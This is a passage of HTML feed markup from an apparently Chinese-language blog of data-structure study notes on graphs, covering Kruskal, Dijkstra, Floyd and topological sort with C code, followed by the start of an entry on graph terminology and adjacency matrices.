class="hljs-type">void</span> <span class="hljs-title function_">MiniSpanTree_Kruskal</span><span class="hljs-params">(AMGraph G)</span><br>&#123;<span class="hljs-comment">//无向网G以邻接矩阵形式存储，构造G的最小生成树T, 输出T的各条边</span><br>Sort(Edge);<span class="hljs-comment">//将数组Edge中各元素按权值从小到大排序</span><br><span class="hljs-keyword">for</span> (i = O; i &lt; G.vexnum; ++i)  <span class="hljs-comment">//辅助数组，表示各顶点自成一个连通分量</span><br>Vexset[i] = i;<br><span class="hljs-keyword">for</span> (i = O; i &lt; G.arcnum; ++i)  <span class="hljs-comment">//依次查看数组Edge中的边</span><br>&#123;<br>vl = LocateVex(G, Edge[i].Head);  <span class="hljs-comment">//vl为边的始点 Head 的下标</span><br>v2 = LocateVex(G, Edge[i].Tail);  <span class="hljs-comment">//v2为边的终点Tail的下标</span><br>vsl = Vexset[vl];  <span class="hljs-comment">//获取边 Edge[i]的始点所在的连通分量vs1</span><br>vs2 = Vexset[v2];  <span class="hljs-comment">//获取边 Edge[i]的终点所在的连通分量vs2</span><br><span class="hljs-keyword">if</span> (vsl != vs2)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; Edge[i].Head &lt;&lt; Edge[i].Tail;  <span class="hljs-comment">//输出此边</span><br><span class="hljs-keyword">for</span> (j = O; j &lt; G.vexnurn; ++j) <span class="hljs-comment">//合并VS1和VS2两个分量，即两个集合统一编号</span><br><span class="hljs-keyword">if</span> (Vexset[j] == vs2) Vexset[j] = vsl;   <span class="hljs-comment">//集合编号为vs2的都改为vsl</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最短路径">最短路径</h4><img src="/2024/02/19/%E5%9B%BE2/191924.jpg" class=""><ul><li><p>Dijkstra算法</p><ul><li><p><strong>时间复杂度：O(n^3^)</strong></p></li><li><p>思想：</p><p>1.初始化：先找出从源点v0到各终点vk的直达路径（v0 ,vk）， 即通过一条弧到达的路径。</p><p>2.选择：从这些路径中找出一条长度最短的路径（v0 ,u）。</p><p>3.更新：然后对其余各条路径进行适当调整：</p></li><li><p>存储结构：</p><p>主：邻接矩阵G[n] [n] (或者邻接表)</p><p>辅： 数组S[n]：记录相应顶点是否已被确定最短距离</p><p>​         数组D[n]：记录源点到相应顶点路径长度</p><p>​         数组Path[n]：记录相应顶点的前驱顶点</p></li><li><p>算法步骤：</p><p>① 初始化：</p><p>​将源点v0加到S中，即S[v0] = true；</p><p>​将v0到各个终点的最短路径长度初始化为权值，即 D[i] = G.arcs[v0] [vi]，(vi∈V − S)；</p><p>​如果v0和顶点vi之间有弧，则将vi的前驱置为v0，即 Path[i] = v0，否则Path[i] = −1。</p><img src="/2024/02/19/%E5%9B%BE2/203816.jpg" class=""><img src="/2024/02/19/%E5%9B%BE2/204234.jpg" class=""><p>② 选择下一条最短路径的终点vk，使得： D[k] = Min{D[i]|vi∈V − S}</p><p>③ 将vk加到S中，即S[vk] = true。</p><p>④ 更新从v0出发到集合V − S上任一顶点的最短路径的长度， 同时更改vi的前驱为vk。 若S[i]=false 且 D[k]+G.arcs[k] [i]</p><p>⑤ 重复②～④ n − 1次，即可按照路径长度的递增顺序，逐个 求得从v0到图上其余各顶点的最短路径。</p><p>👀</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">ShortestPath_DIj</span><span class="hljs-params">(AMGraph G,<span class="hljs-type">int</span> v0)</span><br>&#123;<br><span class="hljs-comment">//用Dijkstra算法求有向网G的v0顶点到其余顶点的最短路径</span><br>n=G.vexnum; <span class="hljs-comment">//n为G中顶点的个数</span><br><span class="hljs-keyword">for</span>(v = <span class="hljs-number">0</span>; v&lt;n; ++v)&#123;   <span class="hljs-comment">//n个顶点依次初始化</span><br>S[v] = <span class="hljs-literal">false</span>;   <span class="hljs-comment">//S初始为空集</span><br>D[v] = G.arcs[v0][v];   <span class="hljs-comment">//将v0到各个终点的最短路径长度初始化</span><br><span class="hljs-keyword">if</span>(D[v]&lt; MaxInt) Path [v]=v0;   <span class="hljs-comment">//v0和v之间有弧，将v的前驱置为v0 </span><br><span class="hljs-keyword">else</span> Path [v]=<span class="hljs-number">-1</span>;   <span class="hljs-comment">//如果v0和v之间无弧，则将v的前驱置为-1 </span><br>&#125;<span class="hljs-comment">//for </span><br><br><br>S[v0]=<span class="hljs-literal">true</span>;   <span class="hljs-comment">//将v0加入S </span><br>D[v0]=<span class="hljs-number">0</span>;   <span class="hljs-comment">//源点到源点的距离为0 </span><br><br><br><span class="hljs-comment">/*―开始主循环，每次求得v0到某个顶点v的最短路径，将v加到S集―*/</span> <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;n; ++i)&#123;   <span class="hljs-comment">//对其余n−1个顶点，依次进行计算</span><br>min= MaxInt; <br><span class="hljs-keyword">for</span>(w=<span class="hljs-number">0</span>;w&lt;n; ++w) <br><span class="hljs-keyword">if</span>(!S[w]&amp;&amp;D[w]&lt;min) <br>&#123;v=w; min=D[w];&#125;   <span class="hljs-comment">//选择一条当前的最短路径，终点为v </span><br>S[v]=<span class="hljs-literal">true</span>;   <span class="hljs-comment">//将v加入S </span><br><span class="hljs-keyword">for</span>(w=<span class="hljs-number">0</span>;w&lt;n; ++w) <span class="hljs-comment">//更新从v0出发到集合V−S上所有顶点的最短路径长度</span><br><span class="hljs-keyword">if</span>(!S[w]&amp;&amp;(D[v]+G.arcs[v][w]&lt;D[w]))<br>            &#123; <br>D[w]=D[v]+G.arcs[v][w];   <span class="hljs-comment">//更新D[w] </span><br>Path [w]=v;   <span class="hljs-comment">//更改w的前驱为v </span><br>&#125;<span class="hljs-comment">//if </span><br>   &#125;<span class="hljs-comment">//for </span><br>&#125;<span class="hljs-comment">//ShortestPath_DIJ</span><br><br></code></pre></td></tr></table></figure><p>用Dijkstra算法可以求得有向图G=(V，E)中每一 对顶点间的最短路径。即，每次以一个不同的顶点为源点重复 Dijkstra算法便可求得每一对顶点间的最短路径，<strong>时间复杂度</strong>是<strong>O(n^3^)</strong> 。</p></li></ul></li><li><p>Floyd算法：</p><ul><li><p><strong>时间复杂度：O(n^3^)</strong></p></li><li><p>核心代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;=n<span class="hljs-number">-1</span>; k++) <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;=n<span class="hljs-number">-1</span>; i++) <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;=n<span class="hljs-number">-1</span>; j++) <br><span class="hljs-keyword">if</span>(A[i][k]+A[k][j]&lt;A[i][j])<br>A[i][j]=A[i][k]+A[k][j];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//👀</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ShortestPath_Floyd</span><span class="hljs-params">(AMGraph G)</span><br>&#123;<span class="hljs-comment">//用Floyd算法求有向网G中各对顶点1和）之间的最短路径</span><br><span class="hljs-keyword">for</span> (i = O; i &lt; G.vexnum; ++i)  <span class="hljs-comment">//各对结点之间初始已知路径及距离</span><br><span class="hljs-keyword">for</span> (j = O; j &lt; G.vexnum; ++j)<br>&#123;<br>D[i][j] = G.arcs[i][j];<br><span class="hljs-keyword">if</span> (D[i][j] &lt; MaxInt) Path[i][j] = i; <span class="hljs-comment">//如果i和j之间有弧，则将j的前驱置为i</span><br><span class="hljs-keyword">else</span> Path[i][j] = <span class="hljs-number">-1</span>; <span class="hljs-comment">//如果i和j之间无弧，则将j的前驱置为-1</span><br>&#125;<br><span class="hljs-keyword">for</span>(k = O; k &lt; G.vexnum; ++k)<br><span class="hljs-keyword">for</span> (i = O; i &lt; G.vexnum; ++i)<br><span class="hljs-keyword">for</span>(j = O; j &lt; G.vexnum; ++j)<br><span class="hljs-keyword">if</span> (D[i][k] + D[k][j] &lt; D[i][j]) &#123;<br>D[i][j] = D[i][k] + D[k][j];  <span class="hljs-comment">//更新D[i][j]</span><br>Path[i][j] = Path[k][j];  <span class="hljs-comment">//更新j的前驱为k</span><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>思想：</p><p>设顶点集S(初始为空)，用数组A的每个元素A[i][j]保存从Vi 只经过S中的顶点到达Vj的最短路径长度，其思想是：</p><p>① 初始时令S={ } ， A[i][j]的赋初值方式是：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mi>j</mi><mtext>时</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>W</mi><mtext> </mtext><mi>i</mi><mi>j</mi><mtext> </mtext><mo separator="true">,</mo><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi><mtext>且</mtext><mo>&lt;</mo><mi>v</mi><mi>i</mi><mo separator="true">,</mo><mi>v</mi><mi>j</mi><mo>&gt;</mo><mo>∈</mo><mi>E</mi><mo separator="true">,</mo><mi>W</mi><mi>i</mi><mi>j</mi><mtext>为弧上的权值</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi><mtext>且</mtext><mo>&lt;</mo><mi>v</mi><mi>i</mi><mo separator="true">,</mo><mi>v</mi><mi>j</mi><mo>&gt;</mo><mi mathvariant="normal">/</mi><mo>∈</mo><mi>E</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">A[i][j]=\begin{cases}0, i=j时\\W~ij~, i≠j且&lt;vi,vj&gt;∈E,Wij为弧上的权值\\∞, i≠j且&lt;vi,vj&gt;/∈E\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width='0.8889em' height='0.316em' style='width:0.8889em' viewBox='0 0 888.89 316' preserveAspectRatio='xMinYMin'><path d='M384 0 H504 V316 H384z M384 0 H504 V316 H384z'/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width='0.8889em' height='0.316em' style='width:0.8889em' viewBox='0 0 888.89 316' preserveAspectRatio='xMinYMin'><path d='M384 0 H504 V316 H384z M384 0 H504 V316 H384z'/></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">时</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span><span class="mspace nobreak"> </span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">且</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">Wij</span><span class="mord cjk_fallback">为弧上的权值</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">且</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>原因：从Vi只经过S中的顶点(Vk)到达Vj的路径长度可能比原来不经过Vk的路径更短。</p><p>② 将图中一个顶点Vk加入到S中，修改A[i] [j]的值，修改方法是： A[i] [j]=Min{A[i] [j] , (A[i] [k]+A[k] [j]) }</p><p>③ 重复②，直到G的所有顶点都加入到S中为止</p><img src="/2024/02/19/%E5%9B%BE2/210101.jpg" class=""></li></ul></li></ul><img src="/2024/02/19/%E5%9B%BE2/205930.jpg" class=""><h4 id="拓扑排序">拓扑排序</h4><ul><li><p>AOV-网</p><p>用顶点表示活动，用弧表示活动间的优先关系的有向图称为顶点表示活动的网(Activity On  Vertex Network), 简称AOV-网</p><p>在AOV-网中，不应该出现有向环</p></li><li><p>拓扑排序的过程</p><p>:one:在有向图中选一个无前驱的顶点且输出它</p><p>:two:从图中删除该顶点和所有以它为尾的弧</p><p>:three:重复:one:和:two:直至不存在无前驱的顶点</p><p>:four:若此时输出的顶点数小于有向图中的顶点数，则说明有向图中存在环，否则输出的顶点序列即为一个拓扑序列</p></li><li><p>算法👀：</p><ul><li><p>辅助：</p><ul><li>一维数组 indegree[i]： 存放各顶点<strong>入度</strong>，没有前驱的顶点就是入度为零的顶点。删除顶点及以它为尾的弧的操作，可不必真正对图的存储结构进行改变，可用弧头顶点的入度减1的办法来实现</li><li>栈S: 暂存所有<strong>入度为零</strong>的顶点，这样可以避免重复扫描数组indegree检测入度为0的顶点，提高算法的效率</li><li>一维数组topo[i]: 记录拓扑序列的<strong>顶点序号</strong></li></ul></li><li><p>步骤：</p><p>:one:求出各顶点的入度存入数组 indegree[i]中，并将入度为0 的顶点入栈</p><p>:two:只要栈不空， 则重复以下操作:</p><p>​ 将栈顶顶点vi出栈并保存在拓扑序列数组topo中</p><p>​ 对顶点 Vi 的每个邻接点 Vk 的入度减1, 如果 Vk 的入度变为0, 则将 Vk 入栈</p><p>:three:如果输出顶点个数少于AOV-网的顶点个数，则网中存在有向环，无法进行拓扑排序，否则拓扑排序成功</p></li><li><pre><code class="language-c">//拓扑排序int TopologicalSort(ALGraph G, int topo[])&#123;//有向图G采用邻接表存储结构 //若 G 无回路，则生成 G 的一个拓扑序列 topo[]并返回 OK, 否则ERRORFindinDegree(G, indegree);  //求出各顶点的入度存入数组indegree中InitStack(S);  //栈S初始化为空for (i = O; i &lt; G.vexnum; ++i)if (!indegree[i]) Push(S, i);  //入度为0者入栈m = O;  //对输出顶点计数，初始为0while (!StackEmpty(S))   //栈s非空&#123;Pop(S, i);  //将栈顶顶点Vi出栈topo[m] = i;  //将Vi保存在拓扑序列数组topo中++m;  //对输出顶点计数p = G.vertices[i).firstarc;  //p指向Vi的第一个邻接点while (p != NULL)&#123;k = p-&gt;adjvex;  //vk为vi的邻接点--indegree[k];  //vi的每个邻接点的入度减1if (indegree[k] == O) Push(S, k);  //若入度减为0, 则入栈p = p-&gt;nextarc;  //p指向顶点Vi下一个邻接结点    &#125;     &#125;if (m &lt; G.vexnum) return ERROR;  //该有向图有回路else return OK;&#125;</code></pre></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-图（一）</title>
    <link href="/2024/02/19/%E5%9B%BE1/"/>
    <url>/2024/02/19/%E5%9B%BE1/</url>
    
    <content type="html"><![CDATA[<h3 id="图的定义和术语">图的定义和术语</h3><ul><li><p>图：Graph=(V,E)。V：顶点(数据元素)的<strong>有穷非空</strong>集合； E：边的<strong>有穷</strong>集合。</p></li><li><p>完全图：</p><ul><li>完全无向图：n(n-1)/2 条边</li><li>完全有向图：n(n-1) 条边</li></ul></li><li><p>关联(依附)：边/弧与顶点之间的关系。存在(v~i~ , v~j~ )/ &lt;v~i~,v~j~&gt;， 则称该边/弧关联于v~i~和v~j~</p></li><li><p>顶点的度：TD(v)=ID(v)+OD(v)</p><ul><li><p>当有向图中仅1个顶点的入度为0,其余顶点的入度均为1， 此时形状：:deciduous_tree:,而且是有向树</p><img src="/2024/02/19/%E5%9B%BE1/3.jpg" class=""></li></ul></li><li><p>路径：接续的边构成的<strong>顶点序列</strong>。</p></li><li><p>路径长度：路径上边或弧的数目/权值之和。</p></li><li><p>回路(环)：第一个顶点和最后一个顶点相同的路径。</p></li><li><p>简单路径：序列中<strong>顶点不重复</strong>出现的路径。</p></li><li><p>简单回路(简单环)：除路径起点和终点相同外，其余顶点均不相同的路径。</p></li><li><p>连通图：在<strong>无向图</strong>G=( V, {E} )中，若对任何两个顶点 v、u 都存 在从 v 到 u 的路径，则称G是连通图。</p></li><li><p>强连通图：在<strong>有向图</strong>G=( V, {E} )中，若对任何两个顶点 v、u 都存 在从 v 到 u 的路径，则称G是强连通图。</p></li><li><p>带<strong>权</strong>的图称为<strong>网</strong>。</p></li><li><p><strong>连通分量</strong>：<strong>无向图</strong>G 的<strong>极大连通子图</strong>称为G的连通分量。</p><ul><li><p>极大连通子图意思是：该子图是G连通子图，将G的任何不在该子图中的顶点加入，子图不再连通。</p><img src="/2024/02/19/%E5%9B%BE1/4.jpg" class=""></li></ul></li><li><p><strong>强连通分量</strong>：<strong>有向图</strong>G的<strong>极大强连通子图</strong>称为G的强连通分量。</p><ul><li><p>极 大强连通子图意思是：该子图是G的强连通子图，将G的任何不在该子图中的顶点加入，子图不再是强连通的。</p><img src="/2024/02/19/%E5%9B%BE1/5.jpg" class=""></li></ul></li><li><p><strong>生成树</strong>：包含<strong>无向图</strong>G<strong>所有顶点</strong>的<strong>极小连通子图</strong>。</p><img src="/2024/02/19/%E5%9B%BE1/7.jpg" class=""></li><li><p><strong>极小连通子图</strong>：该子图是G的<strong>连通子图</strong>，在该子图中<strong>删除</strong>任何一条边，子图<strong>不再连通</strong>。</p></li><li><p><strong>生成森林</strong>：对<strong>非连通图</strong>，由各个<strong>连通分量</strong>的<strong>生成树</strong>的<strong>集合</strong>。</p></li></ul><h3 id="图的存储结构">图的存储结构</h3><img src="/2024/02/19/%E5%9B%BE1/8.jpg" class=""><h6 id="邻接矩阵-的存储表示">==邻接矩阵==的存储表示</h6><ul><li><p>顶点表：记录各个顶点的信息</p></li><li><p>邻接矩阵：表示各个顶点之间的关系</p></li><li><p>设图 A = (V, E) 有n个顶点，则图的邻接矩阵是一个二维数组A.Edge[n] [n]，定义为：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi mathvariant="normal">.</mi><mi>E</mi><mi>d</mi><mi>g</mi><mi>e</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo><mtext>如果</mtext><mo>&lt;</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>&gt;</mo><mo>∈</mo><mi>E</mi><mtext>或者</mtext><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>s</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">A.Edge[i][j]=\begin{cases}1, 如果&lt;i,j&gt;∈E或者(i,j)∈E\\0, others\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">如果</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord cjk_fallback">或者</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ers</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>无向图的邻接矩阵是<strong>对称</strong>的；</li><li>顶点 i 的<strong>度</strong>＝第 i 行 (列) 中1 的个数；</li><li>特别：完全图的邻接矩阵中，对角元素为0，其余1。</li></ul></li><li><p>在<strong>有向图</strong>的邻接矩阵中， 第 i <strong>行</strong>含义：以结点vi为尾的弧(即<strong>出度边</strong>）； 第 i <strong>列</strong>含义：以结点v~i~为头 的弧(即<strong>入度</strong>边）</p><p>分析1：有向图的邻接矩阵<strong>可能是不对称的</strong>。 分析2：顶点的出度 = 第 i 行元素之和顶点的入度 = 第 i 列元素之和。<strong>顶点的度</strong>=第 i 行元素之和 + 第 i 列元素之和</p></li><li><p>网（有权图）的邻接矩阵表示法</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi mathvariant="normal">.</mi><mi>E</mi><mi>d</mi><mi>g</mi><mi>e</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>W</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo separator="true">,</mo><mtext>如果</mtext><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo><mo>∈</mo><mi>E</mi><mtext>或者</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>∈</mo><mi>V</mi><mi>R</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mtext>无边（弧）</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">A.Edge[i][j]=\begin{cases}W_{ij}, 